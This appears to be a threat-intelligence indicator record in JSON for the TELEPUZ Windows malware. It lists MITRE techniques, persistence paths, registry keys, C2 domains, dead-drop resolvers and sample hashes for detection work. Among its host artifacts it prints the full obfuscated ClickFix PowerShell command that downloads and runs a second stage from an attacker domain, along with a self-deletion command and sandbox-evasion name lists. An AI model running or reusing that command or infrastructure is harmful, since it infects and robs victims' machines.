@@ -1,0 +1,861 @@
+{
+  "malware_family": "TELEPUZ",
+  "threat_actor": "",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "TELEPUZ is a modular, actively developed Windows MaaS malware written in C, spread through CLICKFIX-VIDAR chains and delivered as a 64-bit DLL executed via rundll32. It uses custom RC4 string encryption, import hashing, indirect syscalls, UAC bypass and service persistence (CipherAllocator) while beaconing over WebSockets with multiple dead-drop-resolver fallback C2 mechanisms.",
+  "mitre_techniques": [
+    "T1059.001",
+    "T1106",
+    "T1129",
+    "T1569.002",
+    "T1218.011",
+    "T1543.003",
+    "T1112",
+    "T1548.002",
+    "T1134.001",
+    "T1134.002",
+    "T1055.012",
+    "T1620",
+    "T1562.006",
+    "T1027.007",
+    "T1027",
+    "T1036.005",
+    "T1622",
+    "T1497.001",
+    "T1497.003",
+    "T1539",
+    "T1555",
+    "T1056.001",
+    "T1057",
+    "T1083",
+    "T1082",
+    "T1033",
+    "T1518",
+    "T1614.001",
+    "T1113",
+    "T1560.002",
+    "T1185",
+    "T1071.001",
+    "T1573.002",
+    "T1105",
+    "T1102.001",
+    "T1041",
+    "T1070.004"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe\" -NoP -w h -ep bypass -c \"$h='memsho'+'wblob.forum';$n='f322a5fa.exe';$u='https://'+$h+'/api/index.php?a=grab';$f=$env:TEMP+'\\'+$n;[Net.WebClient]::new().('Down'+'loadFile')($u,$f);ri($f+':Zone.Identifier')-EA 0;& $f",
+      "context": "ClickFix lure PowerShell command downloading second stage to %TEMP%",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "rundll32.exe \"C:\\Users\\Lab\\AppData\\Local\\DCFG\\Runtime\\Themes\\Processor\\twhost.dll\",ServiceRoutine",
+      "context": "Self re-execution command passed to fp_CreateProcessA",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "cmd.exe /c ping 127.0.0.1 -n 5 >nul 2>nul & del \"C:\\Users\\Lab\\Desktop\\telepuz.dll\"",
+      "context": "Self-deletion after 3000ms wait via CreateProcessA",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "rundll32.exe \"C:\\ProgramData\\BrevixCore\\drx_curator.dll\",Control_RunDLL",
+      "context": "DownloadRunModule executing downloaded DLL via rundll32",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "f322a5fa.exe",
+      "context": "Second-stage binary written to %TEMP% by ClickFix command",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "install.exe",
+      "context": "TELEPUZ stager downloaded by VIDAR from hurgadatour.shop",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "telepuz.dll",
+      "context": "TELEPUZ main payload 64-bit DLL",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "export_name",
+      "value": "GatewayLaunch",
+      "context": "Export used as ServiceMain of CipherAllocator service",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "export_name",
+      "value": "ServiceRoutine",
+      "context": "Main malware entry-point export invoked via rundll32",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "mutex",
+      "value": "cfgmgr_mtx",
+      "context": "Mutex created at startup if not already present",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "mutex",
+      "value": "bginfod_mtx",
+      "context": "TELEPUZ mutex from IOC table",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "mutex",
+      "value": "wfj64_mtx",
+      "context": "TELEPUZ mutex from IOC table",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%AppData%\\Local\\DCFG\\Runtime\\Themes\\Processor\\etwhost.dll",
+      "context": "Persistence copy path (DCFG\\Runtime\\Themes\\Processor)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%AppData%\\Roaming\\StateRepository\\Host\\Recovery\\systemreset.dll",
+      "context": "Persistence copy path",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%AppData%\\Local\\MiravaDevices\\noraxrecovery.dll",
+      "context": "Persistence copy path",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%ProgramData%\\XeroxPrint\\Temp\\Worker\\grpeng.dll",
+      "context": "Install path used as service ServiceDll",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%ProgramData%\\Jundrax\\Tracker\\IrenScanner.dll",
+      "context": "Payload install path",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%ProgramData%\\QualcommRF\\dsp_agent.dll",
+      "context": "Payload install path",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\ProgramData\\BrevixCore\\drx_curator.dll",
+      "context": "DLL written by DownloadRunModule then run via rundll32",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\CipherAllocator",
+      "context": "Service registration key with Parameters subkey",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\PilotmasterMast",
+      "context": "Service registration key",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_value",
+      "value": "ImagePath = %SystemRoot%\\System32\\svchost.exe -k KngWrk",
+      "context": "Service ImagePath launching malware in svchost group KngWrk",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_value",
+      "value": "ServiceMain = GatewayLaunch",
+      "context": "ServiceMain export of CipherAllocator service",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_value",
+      "value": "ServiceDll = C:\\ProgramData\\XeroxPrint\\Temp\\Worker\\grpeng.dll",
+      "context": "ServiceDll pointing to TELEPUZ install path",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_value",
+      "value": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\\KngWrk = CipherAllocator",
+      "context": "svchost service group entry registering the malware service",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "Software\\Microsoft\\VisualStudio\\Telemetry",
+      "context": "marker_key reported by GetPathsInfo command",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "service_name",
+      "value": "CipherAllocator",
+      "context": "Masqueraded service name for persistence",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "INJECT:TODO:pid=%u:shellcode_len=%u",
+      "context": "Unimplemented InjectShellcode command return string",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "PATHINFO:",
+      "context": "Prefix of GetPathsInfo command output",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Performs periodic configuration checks and reports telemetry anomalies to the central driver aggregator.",
+      "context": "Service Description value for CipherAllocator",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Pivot Controller Service",
+      "context": "Service DisplayName for CipherAllocator",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "policy_alt_96.config",
+      "context": "Embedded policy blob decrypted with CustomRC4 at runtime",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "0x7A55944C8661571164",
+      "context": "Magic constant compared against ROR/ROL of PEB/TEB/rdtsc values",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "0x97C2CA4B",
+      "context": "Initial seed of the module-name import hashing algorithm",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "0x48076BB1",
+      "context": "Multiplier in module/import name hash (with -0x4767A3AB)",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Goodman",
+      "context": "Hardcoded XOR key for Telegram/Steam/DNS fallback C2 blobs",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "111111111",
+      "context": "XOR key protecting Steam profile C2 name history",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "cee96a38e2dfe31ccf8c3aa7d0d9323e1e3183b2478ba582285822e943d242e9",
+      "context": "AES256-CBC key decrypting fallback C2 from Polygon smart contract",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "h=cal.snehamumbai.org|p=443|ssl=1",
+      "context": "Decrypted fallback C2 configuration string",
+      "specificity": "high",
+      "evidence": "encrypted_config",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "sandbox, malware, virus, test, sample, cuckoo, bruno, jz, dekker, abby, wilbert, johnson, miller, harddisk, currentuser, john, tim, sand box, maltest, pjones, fred",
+      "context": "Hardcoded sandbox/research usernames compared against current username",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "sandbox, virus, malware, tequilaboomboom, hal9th, john-pc, mueller-pc, hanspeter-pc, 7silvia, fortinet, wasp, mars, desk-ivruuh4y14, COMPUTERNAME",
+      "context": "Hardcoded sandbox/research computer names compared against hostname",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "VMware, VirtualBox, QEMU, Parallels",
+      "context": "Hypervisor display device names checked for VM detection",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "0x422,0x423,0x42B,0x42C,0x428,0x437,0x43F,0x440,0x442,0x443,0x818",
+      "context": "Hardcoded CIS country LCID list used for geolocation checks",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "dfscli.dll, davhlpr.dll, msdtclog.dll, dsrole.dll, secur32.dll",
+      "context": "Random library whose .text is patched with indirect syscall trampolines",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "cal.joycedoula.com.br",
+      "context": "Primary C2 in earliest sample configurations",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "cal.snehamumbai.org",
+      "context": "Latest C2 resolved via fallback methods",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "memshowblob.forum",
+      "context": "ClickFix stage-2 hosting domain (api/index.php?a=grab)",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "hurgadatour.shop",
+      "context": "Staging domain serving install.exe stager and telepuz.dll",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "zewaplus.club",
+      "context": "Staging domain serving telepuz.dll in DownloadRunModule",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "chubrik.sbs",
+      "context": "Payload staging domain (first seen 2026-05-09)",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "betalegenda.cfd",
+      "context": "Payload staging domain",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "mavpaprokla.lat",
+      "context": "Payload staging domain",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "comicstar.lat",
+      "context": "Payload staging domain",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "bigblower.click",
+      "context": "Payload staging domain",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "momasites.lol",
+      "context": "Payload staging domain",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "momasites.com",
+      "context": "Payload staging domain",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "mamsites.lol",
+      "context": "Payload staging domain",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "hardenedom.shop",
+      "context": "Payload staging domain",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "hardeneddom.shop",
+      "context": "Payload staging domain",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "netblokirovka.asia",
+      "context": "Payload staging domain",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "netlobikrovka.asia",
+      "context": "Payload staging domain",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "neblokirovka.as",
+      "context": "Payload staging domain",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "kidsko.shop",
+      "context": "Payload staging domain",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "mazaporka.shop",
+      "context": "Payload staging domain",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "krabsburger.xyz",
+      "context": "Payload staging domain (HTTP)",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "172.67.215.214",
+      "context": "Staging IP serving telepuz.dll via Cloudflare",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "172.67.165.144",
+      "context": "Staging IP serving telepuz.dll via Cloudflare",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "codebasecode.com",
+      "context": "DNS-record dead drop resolver for fallback C2",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://memshowblob.forum/api/index.php?a=grab",
+      "context": "ClickFix second-stage download URL",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://hurgadatour.shop/files/telemetriawork/telepuz.dll",
+      "context": "Main payload download URL",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://steamcommunity.com//profiles/76561199705801219",
+      "context": "Steam profile dead drop resolver holding XOR-encrypted C2",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://t.me/chanadarkpart",
+      "context": "Telegram channel dead drop resolver with XOR-encrypted fallback C2",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "JA4DSh4PCy8OAhEAAw8uQQAWCg",
+      "context": "XOR-encrypted fallback C2 blob posted on Telegram/Steam profile",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/cdn/health?sid=",
+      "context": "C2 WebSocket URI with session id parameter",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/ws/inject?cid=",
+      "context": "WebInjector module direct C2 WebSocket URI",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/static/modules/kMP6HBGEA8.bin",
+      "context": "Default KeyLogger module path on C2",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/static/modules/yaVaoS3Bw.bin",
+      "context": "Default WebInjector module path on C2",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/static/modules/W2UMxylgG_.bin",
+      "context": "Default Stealer module path on C2",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/static/assets/chromeelevator.bin",
+      "context": "Default Chrome cookie extractor path on C2",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/files/telemetriawork/telepuz.dll",
+      "context": "Dominant payload download path pattern",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/api/index.php?a=grab",
+      "context": "ClickFix stage-2 retrieval path",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "0xf55Bea1FdCf1c3ABb39ab92567C09aC1BFf6753E",
+      "context": "Polygon smart contract used as fallback C2 resolver and kill switch",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "0xc3f909d4",
+      "context": "Method selector in eth_call JSON to Polygon endpoint",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+      "context": "Hardcoded HTTP header used during manual WebSocket handshake",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "58aec6e3835aaf20f7b4a7e308b36a19e7454673a6f71783871e9bcf6cae8eed",
+      "description": "Reference TELEPUZ main payload (64-bit DLL)"
+    },
+    {
+      "sha256": "bf3b4e645a3c0c23f87c55971069014f7424ad14497371ee7567eff68ffaf343",
+      "description": "TELEPUZ main payload"
+    },
+    {
+      "sha256": "ff791fe1532a2dc3b3c188a71bfd0177f973ef228e4d1dda1db6d3c4b0d62b3e",
+      "description": "TELEPUZ main payload"
+    },
+    {
+      "sha256": "a955d7e2819d5fa8b5f879cb970e1a1a91327098a7383f2a03a5e1e7e19435e3",
+      "description": "TELEPUZ keylogger module"
+    },
+    {
+      "sha256": "9733a3f6409de81271f21993c7f8b9865ac9f5c68c3d4336e91afe6b312477eb",
+      "description": "TELEPUZ stealer module"
+    },
+    {
+      "sha256": "444f1c0c82b3f6cc31d685bac68b20edbde5722ce219af9cceab0c2a6537efc1",
+      "description": "TELEPUZ webinjector module"
+    },
+    {
+      "sha256": "580b441e2961739fd26e54e0a0ea08351cb10a51839519fc722cfa39ecd0c954",
+      "description": "VIDAR Go variant second stage dropping TELEPUZ"
+    },
+    {
+      "sha256": "03fa348b70819296c958c842e7646b3b7efe5fa217ed5098143003c47995a746",
+      "description": "TELEPUZ stager (install.exe), 13-15 KB PE"
+    },
+    {
+      "sha256": "a670b03c1da00ee2c8622fd716085358d7e36ee98c4adafc9bda53eaadd59527",
+      "description": "TELEPUZ file found via telemetriawork VirusTotal pivot"
+    },
+    {
+      "sha256": "7c501632cd3830735040964b69d73a5dc315d0422fe3f1012c4b50db58dc0663",
+      "description": "TELEPUZ file found via telemetriawork VirusTotal pivot"
+    },
+    {
+      "sha256": "55dd76488bdd3ff9530bba5d8a6d4fcb8c67f9a40eb72ab4b48465bfd03a0387",
+      "description": "TELEPUZ file found via telemetriawork VirusTotal pivot"
+    }
+  ],
+  "file_types": [
+    "pe",
+    "elf"
+  ]
+}
